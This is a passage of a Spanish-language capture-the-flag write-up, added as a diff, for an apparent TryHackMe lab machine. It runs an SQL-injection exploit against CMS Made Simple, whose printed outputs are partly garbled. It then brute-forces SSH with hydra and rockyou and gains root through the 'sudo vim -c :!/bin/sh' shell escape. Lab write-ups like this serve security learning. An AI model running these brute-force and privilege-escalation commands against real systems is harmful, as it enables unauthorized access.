@@ -1,0 +1,53 @@
+/simple               (Status: 301) [Size: 313] [--> http://10.10.127.26/simple/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+
+
+ahora buscando en /simple encontramos que utiliza cms made simple y buscamos vulnerabilidad para su version lo cual encontramos que es vulnerable a sqli y su respectivo cve
+
+ahora podemos descargar el exploit de exploit-db o buscarlo con searchsploit y utilizar metaexploit
+
+ip de la maquina 10.10.127.26
+
+usamos el 2to3 para adpatar el codigo y correr el exploit con el objetivo y el directorio (usamos el que nos recomien THM)
+los resultados son
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch34
+[+] Email found: adxI
+[+] Password found: 0c01f4468bp
+
+segundo resultado
+
+[+] Salt for password found: 1dac0ic8
+[+] Username found: mit0f
+[+] Email found: admin@admtUj
+[+] Password found: 0c01f4468bd71
+
+tercer resultado
+
++] Salt for password found: 1da916141s45
+[+] Username found: 3
+[+] Email found: a2AD4Aiz718h47
+[+] Password found: 0c01f4466-gk0
+
+
+como el exploit se rompe a la hora de cracekar usamos hydra con rockyou
+
+hydra -l mitch -P /home/syrax/Documentos/rockyou.txt 10.10.127.26 -s 2222 ssh
+
+[2222][ssh] host: 10.10.127.26   login: mitch   password: secret
+
+al conectarse por ssh con el usuario mitch y la pass secret 
+podemos ver el archivo user.txt
+
+G00d j0b, keep up!
+
+en el directorio /home se pued ver que tambien existe el usuario sunbath
+
+con sudo -l podemos ver que este usuario puede ejecutar vim como sudo
+vamos a gtfobin y buscamos por vim y sudo y utilizamos el siguiente comando (el primero de 3 opciones)
+
+sudo vim -c ':!/bin/sh'
+
+esto no permie escalar privilegios a root y podemos ver la flag.txt
